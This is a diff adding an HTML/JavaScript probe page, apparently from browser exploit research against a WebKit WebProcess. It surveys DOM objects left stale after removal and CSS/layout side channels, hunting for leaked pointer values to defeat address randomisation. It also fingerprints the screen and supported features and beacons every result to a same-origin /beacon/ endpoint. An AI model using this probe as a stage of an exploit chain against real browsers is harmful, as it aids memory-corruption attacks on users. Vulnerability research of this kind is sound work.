@@ -1,0 +1,216 @@
+<!--
+  p633: WebProcess text base — DOM stale pointer + CSS side channel
+  Route (d): DOM objects with stale pointers readable from JS
+  Route (e): CSS/layout side channels
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p633</title></head>
+<body>p633: DOM stale ptr + CSS side channel
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<div id="workspace" style="position:relative"></div>
+<script>
+var L = document.getElementById('log');
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P633-' + encodeURIComponent(s), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); };
+
+var f64 = new Float64Array(1);
+var u8 = new Uint8Array(f64.buffer);
+function d2h(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8[i].toString(16)).slice(-2);
+  return h;
+}
+function isPtr(d) {
+  if (typeof d !== 'number' || d === 0 || isNaN(d)) return false;
+  f64[0] = d;
+  var hi = (u8[7] << 8) | u8[6];
+  return (hi > 0 && hi < 0x7FFF);
+}
+
+emit('START', 'survey v2');
+
+// D1: SVGMatrix
+try {
+  var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+  document.getElementById('workspace').appendChild(svg);
+  var ctm = svg.createSVGMatrix();
+  emit('D1', 'a=' + ctm.a + ' d=' + ctm.d + ' e=' + ctm.e + ' f=' + ctm.f);
+  var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+  rect.setAttribute('transform', 'rotate(45)');
+  svg.appendChild(rect);
+  svg.removeChild(rect);
+  try {
+    var bl = rect.transform.baseVal;
+    if (bl.numberOfItems > 0) {
+      var mx = bl.getItem(0).matrix;
+      emit('D1-DET', 'a=' + mx.a + ' e=' + mx.e);
+    } else { emit('D1-DET', 'empty baseVal'); }
+  } catch(e) { emit('D1-DET', 'err=' + String(e).slice(0,60)); }
+} catch(e) { emit('D1-ERR', String(e).slice(0,80)); }
+
+// D2: Range on mutated DOM
+try {
+  var div = document.createElement('div');
+  div.innerHTML = '<span>AAA</span><span>BBB</span><span>CCC</span>';
+  document.getElementById('workspace').appendChild(div);
+  var spans = div.getElementsByTagName('span');
+  var range = document.createRange();
+  range.setStart(spans[0].firstChild, 1);
+  range.setEnd(spans[2].firstChild, 2);
+  var before = range.toString();
+  div.removeChild(spans[1]);
+  var after = '';
+  try { after = range.toString(); } catch(e) { after = 'ERR'; }
+  var r = range.getBoundingClientRect();
+  emit('D2', 'before=' + before + ' after=' + after);
+  emit('D2-RECT', 'x=' + r.x + ' y=' + r.y + ' w=' + r.width + ' h=' + r.height);
+  var rp = [r.x, r.y, r.width, r.height].filter(isPtr);
+  if (rp.length) emit('D2-PTR', rp.map(d2h).join(','));
+} catch(e) { emit('D2-ERR', String(e).slice(0,80)); }
+
+// D3: getComputedStyle on detached element
+try {
+  var el = document.createElement('div');
+  el.style.width = '100px';
+  document.body.appendChild(el);
+  var cs = getComputedStyle(el);
+  var w1 = cs.width;
+  document.body.removeChild(el);
+  var w2 = cs.width;
+  emit('D3', 'attached=' + w1 + ' detached=' + w2);
+} catch(e) { emit('D3-ERR', String(e).slice(0,80)); }
+
+// D4: CSSRule after deletion
+try {
+  var sty = document.createElement('style');
+  sty.textContent = '.a{color:red} .b{margin:10px}';
+  document.head.appendChild(sty);
+  var rule0 = sty.sheet.cssRules[0];
+  var t0 = rule0.cssText;
+  sty.sheet.deleteRule(0);
+  var stale = '';
+  try { stale = rule0.cssText; } catch(e) { stale = 'ERR:' + e.message.slice(0,30); }
+  emit('D4', 'before=' + t0.slice(0,30) + ' stale=' + stale.slice(0,30));
+  document.head.removeChild(sty);
+} catch(e) { emit('D4-ERR', String(e).slice(0,80)); }
+
+// D5: Event.target during removal
+try {
+  var btn = document.createElement('button');
+  btn.textContent = 'x';
+  document.getElementById('workspace').appendChild(btn);
+  var evInfo = null;
+  btn.addEventListener('click', function(e) {
+    btn.parentNode.removeChild(btn);
+    evInfo = e.target ? e.target.tagName : 'null';
+  });
+  btn.click();
+  emit('D5', 'target_after_remove=' + evInfo);
+} catch(e) { emit('D5-ERR', String(e).slice(0,80)); }
+
+// D6: MutationObserver
+try {
+  var c = document.createElement('div');
+  c.innerHTML = '<p>test</p>';
+  document.getElementById('workspace').appendChild(c);
+  var mo = new MutationObserver(function() {});
+  mo.observe(c, {childList: true});
+  c.removeChild(c.querySelector('p'));
+  var recs = mo.takeRecords();
+  emit('D6', 'records=' + recs.length + (recs.length ? ' type=' + recs[0].type : ''));
+  mo.disconnect();
+} catch(e) { emit('D6-ERR', String(e).slice(0,80)); }
+
+// D7: ImageBitmap (may not exist)
+try {
+  if (typeof createImageBitmap === 'function') {
+    emit('D7', 'createImageBitmap available');
+  } else {
+    emit('D7', 'createImageBitmap NOT available');
+  }
+} catch(e) { emit('D7-ERR', String(e).slice(0,80)); }
+
+// D8: AudioContext
+try {
+  var AC = window.AudioContext || window.webkitAudioContext;
+  emit('D8', AC ? 'AudioContext available' : 'AudioContext NOT available');
+} catch(e) { emit('D8-ERR', String(e).slice(0,80)); }
+
+// D9: DOM toString for hex
+try {
+  var objs = [
+    ['document', document], ['location', location],
+    ['navigator', navigator], ['history', history]
+  ];
+  var hexFound = [];
+  for (var i = 0; i < objs.length; i++) {
+    try {
+      var s = String(objs[i][1]);
+      if (/0x[0-9a-f]{6,}/i.test(s)) hexFound.push(objs[i][0] + ':' + s.slice(0,40));
+    } catch(e) {}
+  }
+  emit('D9', hexFound.length ? hexFound.join('|') : 'no hex in toString');
+} catch(e) { emit('D9-ERR', String(e).slice(0,80)); }
+
+// E1: getBoundingClientRect precision
+try {
+  var pd = document.createElement('div');
+  pd.style.cssText = 'position:absolute;left:0;top:0;width:33.33%;font-size:13.7px';
+  pd.textContent = 'precision test ABCDEFGHIJ';
+  document.getElementById('workspace').appendChild(pd);
+  var r = pd.getBoundingClientRect();
+  emit('E1', 'w=' + r.width + ' h=' + r.height + ' whex=' + d2h(r.width));
+  document.getElementById('workspace').removeChild(pd);
+} catch(e) { emit('E1-ERR', String(e).slice(0,80)); }
+
+// E2: measureText
+try {
+  var mc = document.createElement('canvas');
+  var ctx = mc.getContext('2d');
+  ctx.font = '13.7px monospace';
+  var m = ctx.measureText('ABCDEFGHIJ');
+  var ext = [];
+  var props = ['actualBoundingBoxLeft','actualBoundingBoxRight','actualBoundingBoxAscent','actualBoundingBoxDescent'];
+  for (var i = 0; i < props.length; i++) {
+    if (typeof m[props[i]] === 'number') ext.push(props[i].replace('actualBoundingBox','') + '=' + m[props[i]]);
+  }
+  emit('E2', 'w=' + m.width + ' ext=' + (ext.length ? ext.join(',') : 'NONE'));
+} catch(e) { emit('E2-ERR', String(e).slice(0,80)); }
+
+// E3: computed properties count + transform
+try {
+  var el3 = document.createElement('div');
+  el3.style.cssText = 'width:100px;height:50px;transform:rotate(1deg)';
+  document.getElementById('workspace').appendChild(el3);
+  var cs3 = getComputedStyle(el3);
+  emit('E3', 'props=' + cs3.length + ' transform=' + (cs3.transform || cs3.webkitTransform || 'none').slice(0,60));
+  document.getElementById('workspace').removeChild(el3);
+} catch(e) { emit('E3-ERR', String(e).slice(0,80)); }
+
+// E4: CSS.supports
+try {
+  if (typeof CSS !== 'undefined' && CSS.supports) {
+    var sup = [];
+    if (CSS.supports('display','grid')) sup.push('grid');
+    if (CSS.supports('display','flex')) sup.push('flex');
+    if (CSS.supports('gap','1px')) sup.push('gap');
+    if (CSS.supports('contain','strict')) sup.push('contain');
+    if (CSS.supports('backdrop-filter','blur(1px)')) sup.push('backdrop');
+    emit('E4', sup.join(',') || 'NONE');
+  } else { emit('E4', 'CSS.supports NOT available'); }
+} catch(e) { emit('E4-ERR', String(e).slice(0,80)); }
+
+// E5: screen info
+try {
+  emit('E5', 'dpr=' + devicePixelRatio + ' screen=' + screen.width + 'x' + screen.height +
+    ' inner=' + innerWidth + 'x' + innerHeight + ' color=' + screen.colorDepth);
+} catch(e) { emit('E5-ERR', String(e).slice(0,80)); }
+
+emit('ALIVE', 'complete');
+</script>
+</body></html>
